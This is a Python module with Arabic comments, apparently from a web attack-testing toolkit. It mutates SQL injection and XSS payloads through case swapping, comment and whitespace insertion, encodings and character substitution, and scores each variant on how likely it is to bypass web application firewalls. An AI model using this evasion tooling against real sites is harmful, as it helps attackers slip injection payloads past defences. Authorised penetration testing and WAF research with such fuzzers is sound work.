
import random
import re
import string
import copy
from typing import Dict, List, Optional, Any, Set, Tuple
from dataclasses import dataclass
from enum import Enum

from .payload_generator import Payload, PayloadType, get_payload_generator

import logging

logger = logging.getLogger(__name__)


class MutationTechnique(Enum):
    """تقنيات التحوير"""
    CASE_SWAPPING = "case_swapping"           # تغيير حالة الأحرف
    WHITESPACE_INSERTION = "whitespace_insertion"  # إضافة مسافات
    COMMENT_INSERTION = "comment_insertion"   # إضافة تعليقات
    ENCODING = "encoding"                     # ترميز مختلف
    CHARACTER_REPLACEMENT = "character_replacement"  # استبدال الأحرف
    DOUBLE_ENCODING = "double_encoding"       # ترميز مزدوج
    SPLIT_PAYLOAD = "split_payload"           # تقسيم الحمولة
    RECURSIVE = "recursive"                   # تكرار التحوير
    POLYMORPHIC = "polymorphic"               # تحوير متعدد الأشكال


@dataclass
class MutationResult:
    """نتيجة التحوير"""
    original: Payload
    mutated: Payload
    technique: MutationTechnique
    success: bool
    score: float = 1.0  # درجة التحوير (كلما زادت زادت الاحتمالية للتجاوز)


class PayloadMutator:
    """
    محول الحمولات المتقدم
    
    الميزات:
    - تحوير الحمولات باستخدام تقنيات متعددة
    - تحوير متعدد الأشكال (Polymorphic)
    - تحوير تكراري (Recursive)
    - توليد آلاف الأشكال المختلفة
    - تقييم فعالية التحوير
    - تجاوز أنظمة WAF
    """
    
    # استبدالات الأحرف الشائعة للتجاوز
    CHARACTER_MAPPINGS = {
        # SQLi bypasses
        "'": ["%27", "\\'", "''", "‘", "’", "`"],
        '"': ['%22', '\\"', '""', "“", "”"],
        " ": ["/**/", "%20", "+", "\t", "\n", "\r", "--%0a"],
        "=": ["LIKE", "REGEXP", "RLIKE", ">=", "<=", "<>", "!"],
        "OR": ["||", "OR", "or", "Or", "oR"],
        "AND": ["&&", "AND", "and", "And", "aNd"],
        "SELECT": ["SeLeCt", "sElEcT", "select", "sel*ect"],
        "UNION": ["UnIoN", "union", "uni%6fn", "uni/**/on"],
        
        # XSS bypasses
        "<": ["%3c", "\\x3c", "&lt;", "&#60;", "\\u003c"],
        ">": ["%3e", "\\x3e", "&gt;", "&#62;", "\\u003e"],
        "script": ["ScRiPt", "SCRIPT", "scr%69pt", "scr&#x69;pt"],
        "alert": ["ALERT", "alert", "aler%74", "ale&#x72;t"],
    }
    
    # أنماط التعليقات
    COMMENT_PATTERNS = [
        "/*{}*/", "<!--{}-->", "#{}", "--{}", "//{}", "`{}`", "``{}``",
        "/**/", "/*!*/", "/*!50000*/", "-- -", "#%0a", "/*%0a*/"
    ]
    
    # ترميزات متعددة للتجاوز
    ENCODINGS = ["url", "double_url", "html_entity", "hex", "base64", "unicode"]
    
    def __init__(self):
        self._mutated_payloads: List[MutationResult] = []
        self._mutation_cache: Dict[str, List[Payload]] = {}
        
        logger.info("PayloadMutator initialized")
    
    def mutate_payload(
        self,
        payload: Payload,
        techniques: List[MutationTechnique] = None,
        max_depth: int = 2
    ) -> List[MutationResult]:
        """
        تحوير حمولة باستخدام تقنيات متعددة
        
        Args:
            payload: الحمولة الأصلية
            techniques: قائمة التقنيات للاستخدام (كل التقنيات إذا لم تحدد)
            max_depth: أقصى عمق للتحوير التكراري
        
        Returns:
            قائمة بنتائج التحوير
        """
        if techniques is None:
            techniques = list(MutationTechnique)
        
        results = []
        
        for technique in techniques:
            mutated = self._apply_technique(payload, technique)
            if mutated:
                result = MutationResult(
                    original=payload,
                    mutated=mutated,
                    technique=technique,
                    success=True,
                    score=self._calculate_score(mutated)
                )
                results.append(result)
                self._mutated_payloads.append(result)
        
        # تحوير تكراري إذا لزم الأمر
        if max_depth > 1:
            recursive_results = self._recursive_mutate(results, max_depth - 1)
            results.extend(recursive_results)
        
        return results
    
    def _apply_technique(
        self,
        payload: Payload,
        technique: MutationTechnique
    ) -> Optional[Payload]:
        """تطبيق تقنية تحوير محددة"""
        
        if technique == MutationTechnique.CASE_SWAPPING:
            return self._case_swap(payload)
        
        elif technique == MutationTechnique.WHITESPACE_INSERTION:
            return self._insert_whitespace(payload)
        
        elif technique == MutationTechnique.COMMENT_INSERTION:
            return self._insert_comments(payload)
        
        elif technique == MutationTechnique.ENCODING:
            return self._apply_encoding(payload)
        
        elif technique == MutationTechnique.CHARACTER_REPLACEMENT:
            return self._replace_characters(payload)
        
        elif technique == MutationTechnique.DOUBLE_ENCODING:
            return self._double_encode(payload)
        
        elif technique == MutationTechnique.SPLIT_PAYLOAD:
            return self._split_payload(payload)
        
        elif technique == MutationTechnique.POLYMORPHIC:
            return self._polymorphic_mutate(payload)
        
        return None
    
    def _case_swap(self, payload: Payload) -> Optional[Payload]:
        """تغيير حالة الأحرف بشكل عشوائي"""
        new_payload_str = ""
        
        for char in payload.payload:
            if char.isalpha() and random.random() > 0.5:
                new_payload_str += char.swapcase()
            else:
                new_payload_str += char
        
        return Payload(
            id=f"{payload.id}_case",
            name=f"{payload.name} (Case Swapped)",
            type=payload.type,
            payload=new_payload_str,
            encoding=payload.encoding,
            description=f"Case swapped version of {payload.name}",
            tags=payload.tags + ["mutated", "case_swapped"],
            metadata={**payload.metadata, "mutation": "case_swap"}
        )
    
    def _insert_whitespace(self, payload: Payload) -> Optional[Payload]:
        """إضافة مسافات وأحرف بيضاء"""
        # أنماط المسافات المختلفة
        whitespace_chars = [" ", "\t", "\n", "\r", "\x0b", "\x0c", "%20", "+", "/**/"]
        
        # إضافة مسافات عشوائية
        new_payload_str = ""
        for char in payload.payload:
            new_payload_str += char
            if random.random() > 0.7 and char.isalnum():
                new_payload_str += random.choice(whitespace_chars)
        
        return Payload(
            id=f"{payload.id}_whitespace",
            name=f"{payload.name} (Whitespace)",
            type=payload.type,
            payload=new_payload_str,
            encoding=payload.encoding,
            description=f"Whitespace inserted version of {payload.name}",
            tags=payload.tags + ["mutated", "whitespace"],
            metadata={**payload.metadata, "mutation": "whitespace_insertion"}
        )
    
    def _insert_comments(self, payload: Payload) -> Optional[Payload]:
        """إضافة تعليقات داخل الحمولة"""
        comment = random.choice(self.COMMENT_PATTERNS)
        random_string = ''.join(random.choices(string.ascii_letters, k=3))
        
        # إدراج التعليق في موقع عشوائي
        if len(payload.payload) > 3:
            insert_pos = random.randint(1, len(payload.payload) - 1)
            new_payload_str = (
                payload.payload[:insert_pos] + 
                comment.format(random_string) + 
                payload.payload[insert_pos:]
            )
        else:
            new_payload_str = payload.payload + comment.format(random_string)
        
        return Payload(
            id=f"{payload.id}_comment",
            name=f"{payload.name} (Comments)",
            type=payload.type,
            payload=new_payload_str,
            encoding=payload.encoding,
            description=f"Comments inserted version of {payload.name}",
            tags=payload.tags + ["mutated", "comments"],
            metadata={**payload.metadata, "mutation": "comment_insertion"}
        )
    
    def _apply_encoding(self, payload: Payload) -> Optional[Payload]:
        """تطبيق ترميز عشوائي"""
        from .payload_generator import EncodingType
        
        encoding = random.choice([
            "url", "double_url", "html_entity", "hex", "base64"
        ])
        
        if encoding == "url":
            import urllib.parse
            new_payload_str = urllib.parse.quote(payload.payload)
            encoding_type = "url"
        elif encoding == "double_url":
            import urllib.parse
            new_payload_str = urllib.parse.quote(urllib.parse.quote(payload.payload))
            encoding_type = "double_url"
        elif encoding == "html_entity":
            new_payload_str = payload.payload.replace("<", "&lt;").replace(">", "&gt;")
            encoding_type = "html"
        elif encoding == "hex":
            new_payload_str = payload.payload.encode().hex()
            encoding_type = "hex"
        elif encoding == "base64":
            import base64
            new_payload_str = base64.b64encode(payload.payload.encode()).decode()
            encoding_type = "base64"
        else:
            return None
        
        return Payload(
            id=f"{payload.id}_encoded",
            name=f"{payload.name} ({encoding_type})",
            type=payload.type,
            payload=new_payload_str,
            encoding=EncodingType(encoding_type) if hasattr(EncodingType, encoding_type.upper()) else None,
            description=f"Encoded version of {payload.name} using {encoding_type}",
            tags=payload.tags + ["mutated", "encoded"],
            metadata={**payload.metadata, "mutation": "encoding", "encoding_used": encoding_type}
        )
    
    def _replace_characters(self, payload: Payload) -> Optional[Payload]:
        """استبدال الأحرف بأشكال مختلفة للتجاوز"""
        new_payload_str = payload.payload
        
        for original, replacements in self.CHARACTER_MAPPINGS.items():
            replacement = random.choice(replacements)
            new_payload_str = new_payload_str.replace(original, replacement)
        
        return Payload(
            id=f"{payload.id}_replaced",
            name=f"{payload.name} (Char Replaced)",
            type=payload.type,
            payload=new_payload_str,
            encoding=payload.encoding,
            description=f"Character replaced version of {payload.name}",
            tags=payload.tags + ["mutated", "char_replaced"],
            metadata={**payload.metadata, "mutation": "character_replacement"}
        )
    
    def _double_encode(self, payload: Payload) -> Optional[Payload]:
        """ترميز مزدوج (URL encode ثم encode مرة أخرى)"""
        import urllib.parse
        
        # ترميز أول مرة
        first_encoded = urllib.parse.quote(payload.payload)
        
        # ترميز ثاني مرة
        second_encoded = urllib.parse.quote(first_encoded)
        
        # احتمالية اختيار الترميز المزدوج أو التحويرات الأخرى
        if random.random() > 0.5:
            # ترميز أحرف معينة فقط
            second_encoded = second_encoded.replace("%", "%25")
        
        return Payload(
            id=f"{payload.id}_double_encoded",
            name=f"{payload.name} (Double Encoded)",
            type=payload.type,
            payload=second_encoded,
            encoding=None,
            description=f"Double encoded version of {payload.name}",
            tags=payload.tags + ["mutated", "double_encoded"],
            metadata={**payload.metadata, "mutation": "double_encoding"}
        )
    
    def _split_payload(self, payload: Payload) -> Optional[Payload]:
        """
        تقسيم الحمولة إلى أجزاء وجمعها مع ترميزات
        
        مثال: <script>alert(1)</script> -> <scr%69pt>alert(1)</scr%69pt>
        """
        new_payload_str = payload.payload
        split_chars = ["<", ">", "/", " "]
        
        for char in split_chars:
            if char in new_payload_str:
                parts = new_payload_str.split(char)
                if len(parts) > 1:
                    # إضافة ترميز لجزء واحد
                    idx = random.randint(0, len(parts) - 1)
                    import urllib.parse
                    parts[idx] = urllib.parse.quote(parts[idx])
                    new_payload_str = char.join(parts)
        
        return Payload(
            id=f"{payload.id}_split",
            name=f"{payload.name} (Split)",
            type=payload.type,
            payload=new_payload_str,
            encoding=payload.encoding,
            description=f"Split version of {payload.name}",
            tags=payload.tags + ["mutated", "split"],
            metadata={**payload.metadata, "mutation": "split_payload"}
        )
    
    def _polymorphic_mutate(self, payload: Payload) -> Optional[Payload]:
        """
        تحوير متعدد الأشكال - تطبيق عدة تقنيات عشوائية بشكل متسلسل
        """
        techniques = list(MutationTechnique)
        techniques.remove(MutationTechnique.POLYMORPHIC)  # منع التكرار اللانهائي
        
        num_techniques = random.randint(2, 4)
        selected = random.sample(techniques, min(num_techniques, len(techniques)))
        
        current_payload = payload
        applied_techniques = []
        
        for technique in selected:
            result = self._apply_technique(current_payload, technique)
            if result:
                current_payload = result
                applied_techniques.append(technique.value)
        
        if applied_techniques:
            return Payload(
                id=f"{payload.id}_polymorphic",
                name=f"{payload.name} (Polymorphic)",
                type=payload.type,
                payload=current_payload.payload,
                encoding=current_payload.encoding,
                description=f"Polymorphic version with {', '.join(applied_techniques)}",
                tags=payload.tags + ["mutated", "polymorphic"],
                metadata={
                    **payload.metadata,
                    "mutation": "polymorphic",
                    "applied_techniques": applied_techniques
                }
            )
        
        return None
    
    def _recursive_mutate(
        self,
        mutations: List[MutationResult],
        remaining_depth: int
    ) -> List[MutationResult]:
        """
        تحوير تكراري - تطبيق التحوير على النتائج نفسها
        """
        if remaining_depth <= 0:
            return []
        
        results = []
        for mutation in mutations:
            # تطبيق تحوير على النتيجة المتحورة
            recursive_mutations = self.mutate_payload(
                mutation.mutated,
                max_depth=1  # عمق واحد فقط لمنع الحلقات اللانهائية
            )
            results.extend(recursive_mutations)
        
        return results
    
    def _calculate_score(self, payload: Payload) -> float:
        """
        حساب درجة فعالية التحوير
        
        كلما زادت درجة التحوير، زادت احتمالية تجاوز الحماية
        """
        score = 1.0
        
        # زيادة النقاط للترميزات
        if payload.encoding and payload.encoding.value != "none":
            score += 0.5
        
        # زيادة النقاط للبيانات المشفرة
        if "encoded" in str(payload.tags) or "double_encoded" in str(payload.tags):
            score += 0.3
        
        # زيادة النقاط للتعليقات والمسافات
        if "comments" in str(payload.tags) or "whitespace" in str(payload.tags):
            score += 0.2
        
        # زيادة النقاط للتحوير متعدد الأشكال
        if "polymorphic" in str(payload.tags):
            score += 0.5
        
        # زيادة النقاط حسب طول الحمولة (كلما أطول زادت احتمالية التجاوز)
        if len(payload.payload) > 100:
            score += 0.2
        
        return min(score, 3.0)  # الحد الأقصى 3.0
    
    def get_best_mutations(self, payload: Payload, limit: int = 10) -> List[MutationResult]:
        """
        الحصول على أفضل تحويرات لحمولة معينة (حسب درجة الفعالية)
        """
        mutations = self.mutate_payload(payload)
        mutations.sort(key=lambda x: x.score, reverse=True)
        return mutations[:limit]
    
    def mutate_batch(
        self,
        payloads: List[Payload],
        mutations_per_payload: int = 5
    ) -> List[MutationResult]:
        """
        تحوير مجموعة من الحمولات دفعة واحدة
        """
        all_results = []
        
        for payload in payloads:
            results = self.mutate_payload(payload)
            all_results.extend(results[:mutations_per_payload])
        
        return all_results


# نسخة عالمية
_default_mutator = None


def get_payload_mutator() -> PayloadMutator:
    """الحصول على نسخة عالمية من محول الحمولات"""
    global _default_mutator
    if _default_mutator is None:
        _default_mutator = PayloadMutator()
    return _default_mutator

